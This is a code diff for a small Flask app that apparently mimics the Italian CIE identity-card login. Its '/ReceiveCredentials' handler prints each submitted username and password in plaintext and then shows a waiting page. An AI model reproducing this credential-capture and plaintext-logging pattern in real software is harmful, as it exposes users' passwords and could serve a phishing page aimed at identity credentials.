@@ -6,6 +6,7 @@ app = Flask(__name__)
 # - implement qr code CIE login
 # - implement actual login
 # - remove hardcoded challenges and similar. They will all be sent as parameters
+# - how to make "Credenziali non valide" appear on wrong username/psw
 
 
 # QR code functioning:
@@ -18,7 +19,7 @@ app = Flask(__name__)
 
 
 @app.route('/')
-def home():
+def landing_page():
     return render_template('landing_page.html')
 
 
@@ -33,10 +34,14 @@ def login_cie():
 
 @app.route('/ReceiveCredentials', methods=['POST'])
 def receive():
-    print(request.form.get('username'))
-    print(request.form.get('password'))
+    lang = request.form.get('lang')
+    print(f"Username is {request.form.get('username')}")
+    print(f"Password is {request.form.get('password')}")
+    print(f"Lang is {lang}")
 
-    # TODO: redirect to actual page (cie_waiting)
+    if lang == "deu":
+        return render_template("cie_waiting_deu.html")
+
     return render_template("cie_waiting.html")
 
 if __name__ == '__main__':
